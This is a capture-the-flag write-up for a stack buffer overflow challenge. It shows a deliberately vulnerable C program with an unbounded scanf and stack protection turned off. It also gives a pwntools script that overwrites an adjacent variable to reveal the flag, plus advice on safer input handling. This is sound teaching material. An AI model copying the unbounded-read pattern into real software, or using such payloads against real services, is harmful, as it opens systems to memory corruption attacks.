# 0verfl0wed - CTF Challenge Writeup

## Summary

| Item | Value |
|------|-------|
| **Challenge Name** | 0verfl0wed |
| **Category** | Binary Exploitation (Buffer Overflow) |
| **Server** | nc 13.61.183.242 9002 |
| **Flag** | `flag{h0w_did_u_change_it?!}` |

---

## Challenge Description

> This is not as easy. Try harder <3

The challenge provides a network service running on port 9002 and a source file `chall.c`.

---

## Vulnerability Analysis

### Source Code Review

The challenge is based on this C code:

```c
//gcc chall.c -o chall -fno-stack-protector
#include <stdlib.h>
#include<stdio.h>
#include <string.h>

int main(){
    setvbuf(stdout, NULL, _IONBF, 0);
    char vuln [128] = "what is this?";
    char buf [16];
    FILE *fptr;
    fptr = fopen("flag.txt", "r");
    char flag[100];
    fgets(flag, 100, fptr);

    printf("Enter Something: ");
    scanf("%s", buf);

    //This should be impossible to reach!!!
    if(strcmp(vuln, "Unreachable!?!?!?") == 0){
        printf("%s", flag);
    }
    else{
        printf("%s", "Your Input Is: ");
        printf("%s", buf);
        printf("%s", "\n");
    }

    return 0;
}
```

### Identified Vulnerabilities

1. **Buffer Overflow**: The `buf` array is only 16 bytes, but `scanf("%s", buf)` reads input without any bounds checking. This allows writing beyond the buffer.

2. **No Stack Protection**: The binary is compiled with `-fno-stack-protector`, which disables stack canaries that would normally detect buffer overflows.

3. **Adjacent Stack Variables**: On the stack, `vuln[128]` is located at a higher memory address than `buf[16]`. When we overflow `buf`, we write into `vuln`.

### Stack Layout

```
Higher addresses
+------------------+
|    vuln[128]     |  <- We want to overwrite this
+------------------+
|     buf[16]      |  <- User input goes here
+------------------+
Lower addresses
```

### Exploitation Strategy

1. The goal is to make `strcmp(vuln, "Unreachable!?!?!?") == 0` return true
2. We need to overflow `buf` to overwrite `vuln` with "Unreachable!?!?!?"
3. Since `buf` is 16 bytes, we pad with 16 bytes first, then write our target string
4. When `vuln` equals "Unreachable!?!?!?", the program prints the flag

---

## Exploit

### Payload Construction

```
Payload = [16 bytes padding] + "Unreachable!?!?!?"
        = "AAAAAAAAAAAAAAAA" + "Unreachable!?!?!?"
```

### Python Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

r = remote('13.61.183.242', 9002)
r.recvuntil(b': ')

# 16 bytes to fill buf + target string to overwrite vuln
payload = b'A' * 16 + b"Unreachable!?!?!?"

r.sendline(payload)
response = r.recvall(timeout=3)
print(response.decode())
```

### Execution

```
$ python3 solve.py
[*] Trying padding size: 16
[*] Payload length: 33
[*] Response: b'flag{h0w_did_u_change_it?!}'

[+] SUCCESS with padding size 16!
[+] Flag: flag{h0w_did_u_change_it?!}
```

---

## Flag

```
flag{h0w_did_u_change_it?!}
```

---

## Key Takeaways

1. **Never use `scanf("%s", ...)` without bounds checking** - Use `fgets()` or `scanf("%15s", buf)` to limit input size
2. **Stack protectors help** - The `-fno-stack-protector` flag disabled an important security feature
3. **Local variable ordering matters** - The compiler places variables on the stack in a predictable order, making exploitation easier
4. **Buffer overflows are powerful** - Even without controlling the return address, we can modify program state by overwriting adjacent variables
